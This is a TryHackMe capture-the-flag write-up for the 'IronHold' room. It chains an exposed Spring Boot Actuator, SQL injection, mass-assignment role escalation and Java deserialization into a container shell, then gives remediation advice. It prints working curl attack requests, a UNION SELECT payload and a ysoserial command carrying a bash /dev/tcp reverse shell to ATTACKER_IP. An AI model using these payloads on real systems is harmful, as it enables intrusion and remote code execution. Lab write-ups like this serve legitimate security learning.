---
title: "TryHackMe: IronHold"
date: 2026-08-01 23:45:00 +0200
categories: [TryHackMe]
tags:
  - linux
  - web
  - java
  - spring-boot
  - actuator
  - source-code-review
  - sql-injection
  - mass-assignment
  - insecure-deserialization
  - remote-code-execution
description: >-
  IronHold chained exposed Spring Boot Actuator secrets, SQL injection,
  mass-assignment role escalation, and unsafe Java deserialization into
  complete application-container compromise.
author: lenovolegion7
media_subpath: /images/tryhackme_ironhold
image:
  path: room_image.webp
  alt: "Original TryHackMe IronHold room artwork"
toc: true
comments: false
---

**IronHold** was a source-assisted Java web application challenge. The assessment started with a leaked, unredacted Spring Boot repository and a live application exposed on port `8080`. Source review identified an unauthenticated Actuator endpoint, unsafe entity binding, SQL string concatenation, and native Java deserialization. The weaknesses were validated against the live target and chained into officer access, WARDEN authorization, hidden-record disclosure, and command execution as the containerized `appuser` account.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe IronHold room card](room_card.webp){: w="294" h="266" .shadow }](https://tryhackme.com/room/ironhold)

## Initial Enumeration

The supplied material consisted of the full application source archive and a live IronHold instance reachable over HTTP on port `8080`. The source identified a Spring Boot 2.7 application using Java 11, Thymeleaf, JPA, H2, and Spring Boot Actuator.

The assessment was source-assisted, but each reportable weakness was validated against the running application. No claim of root access or escape from the application container was made.

## Validated Attack Path

1. **Source-code review** — The leaked repository exposed broad Actuator access, hidden role binding, SQL concatenation, excessive lookup-table grants, and native Java deserialization.
2. **Secret disclosure** — An unauthenticated Actuator environment endpoint returned the shared kiosk password.
3. **Officer access** — The recovered credential authenticated as the shared `kiosk` officer account.
4. **SQL injection** — A three-column `UNION SELECT` disclosed a hidden `case_files` record through inmate search.
5. **Role escalation** — A hidden `role=WARDEN` profile parameter modified the database-backed authorization state.
6. **Administrative access** — WARDEN privileges exposed the door-control panel and bulk-import functionality.
7. **Remote command execution** — A crafted CommonsCollections6 object was deserialized by `/admin/import`, producing a shell as `appuser`.
8. **Objective validation** — The shell read the facility-server objective from `/opt/ironhold/flag.txt`.

> **Result:** Complete compromise of the IronHold application and its containerized service account from unauthenticated network access plus the leaked source repository.
{: .prompt-danger }

## Source Code Review

### Exposed Actuator Configuration

The application enabled every Spring Boot Actuator web endpoint except heap and thread dumps:

```properties
management.endpoints.web.exposure.include=*
management.endpoints.web.exposure.exclude=heapdump,threaddump

app.kiosk.pw=${KIOSK_PW}
app.flag1.secret=${FLAG1_SECRET}
app.flag2.secret=${FLAG2_SECRET}
app.flag3.secret=${FLAG3_SECRET}
```

The authentication interceptor explicitly excluded `/actuator/**`:

```java
registry.addInterceptor(authInterceptor)
    .addPathPatterns("/**")
    .excludePathPatterns(
        "/", "/login", "/logout", "/about", "/status",
        "/css/**", "/error", "/actuator/**"
    );
```

This made resolved environment-backed secrets accessible without a valid session.

### Unsafe Profile Binding

The profile-update handler accepted a complete `Staff` entity and copied the supplied role into the authenticated user record:

```java
@PostMapping("/profile/update")
public String update(@ModelAttribute Staff staff, HttpSession session) {
    Staff current = staffRepository.findByUsername(
        SessionUtil.currentUsername(session)
    );

    current.setFullName(staff.getFullName());
    current.setEmail(staff.getEmail());

    if (staff.getRole() != null && !staff.getRole().isBlank()) {
        current.setRole(staff.getRole());
    }

    staffRepository.save(current);
    return "redirect:/profile";
}
```

The visible form did not expose the role field, but Spring still bound a hidden attacker-supplied parameter.

### SQL String Concatenation

The inmate search inserted the `q` parameter directly into a quoted SQL string:

```java
@GetMapping("/inmates/search")
public String search(
    @RequestParam(required = false) String q,
    Model model
) {
    String sql =
        "SELECT id, name, block FROM inmates WHERE name = '" + q + "'";

    model.addAttribute("results", jdbcTemplate.queryForList(sql));
    return "inmate-search";
}
```

The lookup database account also had unnecessary `SELECT` access to `case_files`, enabling cross-table disclosure with a `UNION` query.

### Native Java Deserialization

The administrative import handler decoded an arbitrary Base64 request body and passed the result directly to `ObjectInputStream.readObject()`:

```java
@PostMapping(value = "/admin/import", consumes = MediaType.ALL_VALUE)
@ResponseBody
public ResponseEntity<String> importData(@RequestBody String body) {
    byte[] decoded = Base64.getDecoder().decode(body.trim());

    try (ObjectInputStream ois = new ObjectInputStream(
            new ByteArrayInputStream(decoded))) {
        Object restored = ois.readObject();
        return ResponseEntity.ok(
            "Batch accepted: " + restored.getClass().getSimpleName()
        );
    }
}
```

The project included a Commons Collections 3.x dependency compatible with known deserialization gadget chains.

## Initial Access

### Actuator Secret Disclosure

The kiosk credential was requested directly from the exposed management endpoint:

```console
$ curl -s \
  http://TARGET_IP:8080/actuator/env/app.kiosk.pw |
  jq
```

Relevant response:

```json
{
  "property": {
    "source": "Config resource 'application.properties'",
    "value": "[REDACTED]"
  }
}
```

The response disclosed a valid shared OFFICER credential without authentication.

### Officer Authentication

The recovered credential was used to create an authenticated kiosk session:

```console
$ curl -s -i \
  -c ironhold.cookie \
  -X POST \
  http://TARGET_IP:8080/login \
  --data-urlencode 'username=kiosk' \
  --data-urlencode 'password=[REDACTED]'
```

The officer dashboard loaded successfully, and the first authorized objective was retrieved:

```text
THM{[REDACTED]}
```

## SQL Injection

The inmate-search result contained three columns, allowing a compatible `UNION SELECT` to return data from `case_files`:

```console
$ curl -s -G \
  -b ironhold.cookie \
  --data-urlencode \
  "q=' UNION SELECT id, CAST(summary AS VARCHAR), status FROM case_files -- " \
  http://TARGET_IP:8080/inmates/search
```

Selected result:

```text
ID: 1
Name: THM{[REDACTED]}
Block: OPEN
```

This demonstrated that the reduced-privilege lookup account still had excessive access to a sensitive table.

## Privilege Escalation

### Mass Assignment to WARDEN

A hidden role parameter was added to a normal profile update:

```console
$ curl -s -i \
  -b ironhold.cookie \
  -c ironhold.cookie \
  -X POST \
  http://TARGET_IP:8080/profile/update \
  --data-urlencode 'fullName=Shift Kiosk Account' \
  --data-urlencode 'email=kiosk@ironhold.example' \
  --data-urlencode 'badgeNumber=K-000' \
  --data-urlencode 'role=WARDEN'
```

The stored role changed from `OFFICER` to `WARDEN`. Because the authorization interceptor queried the database-backed role for each administrative request, the modified kiosk account immediately satisfied the WARDEN check.

The door-control panel became accessible at `/admin/control`, exposing the third authorized objective:

```text
THM{[REDACTED]}
```

## Remote Command Execution

### Unsafe Deserialization

A CommonsCollections6 object was generated for Java 11 and encoded for submission to the import endpoint:

```console
$ java \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED \
  -jar ysoserial-all.jar \
  CommonsCollections6 \
  'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1"' \
  > cc6.ser

$ base64 -w0 cc6.ser > cc6.b64
```

The payload was submitted with the authenticated WARDEN session:

```console
$ curl -sS -i \
  -b ironhold.cookie \
  -H 'Content-Type: text/plain' \
  --data-binary @cc6.b64 \
  http://TARGET_IP:8080/admin/import
```

The endpoint accepted the serialized object:

```text
HTTP/1.1 200 OK
Batch accepted: HashSet
```

The listener received a shell in the application container:

```console
$ nc -lvnp 443

connect to [ATTACKER_IP] from [TARGET_IP]
appuser@CONTAINER_ID:/app$ id
uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
```

The final authorized objective was read from the application environment:

```console
appuser@CONTAINER_ID:/app$ cat /opt/ironhold/flag.txt
THM{[REDACTED]}
```

The result demonstrated complete compromise of the application container as `appuser`; it did not demonstrate root access or escape to the underlying host.

## Findings Summary

| ID | Severity | Finding | Result |
|---|---|---|---|
| IH-01 | High | Unauthenticated Spring Boot Actuator exposes application secrets | Shared kiosk credential disclosed |
| IH-02 | Critical | Mass assignment permits WARDEN role escalation | Administrative authorization bypassed |
| IH-03 | High | SQL injection exposes hidden case-file records | Restricted record extracted |
| IH-04 | Critical | Unsafe Java deserialization enables remote command execution | Shell as `appuser` obtained |

## Security Impact

The validated chain allowed an external user with the leaked source repository and network access to:

- authenticate as a shared officer account;
- forge WARDEN privileges;
- read records not exposed by normal application pages;
- access electronic door-control functionality;
- execute operating-system commands as the application service account;
- read files and environment-backed secrets available to `appuser`;
- alter application files or behavior and pivot through permitted network paths.

In a real correctional environment, the combined impact could affect staff privacy, physical safety, facility operations, evidentiary integrity, and trust in the management platform.

## Remediation

The findings should be remediated as a connected attack path:

1. Disable `/admin/import` until native Java serialization is removed.
2. Restrict Actuator to essential endpoints such as health and info, bind it to a private management plane, and require strong authentication.
3. Rotate the kiosk credential and every secret exposed through Actuator.
4. Replace direct entity binding with a dedicated profile-update DTO containing only approved fields.
5. Make role changes available only through a dedicated, authorized administrative workflow.
6. Parameterize inmate search and revoke `case_files` access from the lookup database account.
7. Replace native Java serialization with a schema-validated format such as JSON.
8. Remove Commons Collections 3.x and verify that no gadget-capable legacy dependencies remain.
9. Use named operational accounts instead of shared credentials and add audit alerts for role changes, door controls, and bulk imports.
10. Restrict application-container egress and minimize the files, tools, and secrets available to the service account.

## Cleanup

The assessment established no persistence, created no new account, and performed no destructive modification. The reverse-shell listener and locally generated serialized payload were assessment-side artifacts and should be removed after validation.

The source report does not claim root access, host escape, or persistent compromise beyond the containerized `appuser` session.

## Retest Guidance

A focused retest should verify that:

- unauthenticated requests to `/actuator/env` and `/actuator/configprops` return `401`, `403`, or are unreachable;
- the previous kiosk password no longer authenticates;
- supplying `role=WARDEN` to `/profile/update` has no effect and generates a security event;
- the documented `UNION` input is treated as a literal search value;
- the lookup database account cannot read `case_files`;
- serialized Java objects are rejected;
- the import feature accepts only authenticated, integrity-protected, schema-validated data;
- the production artifact contains no known deserialization gadget libraries;
- application-container egress prevents arbitrary reverse-shell connections.

## Lessons Learned

- Source disclosure converts hidden implementation flaws into a practical attack map.
- Management endpoints should never expose resolved secret values to untrusted networks.
- Security-sensitive domain entities should not be bound directly from user-controlled form input.
- Least-privilege database design must account for every table reachable through an injected query.
- Native Java deserialization is unsafe for untrusted data, especially when gadget-capable libraries are present.
- Multiple individually understandable application flaws can combine into complete service compromise.
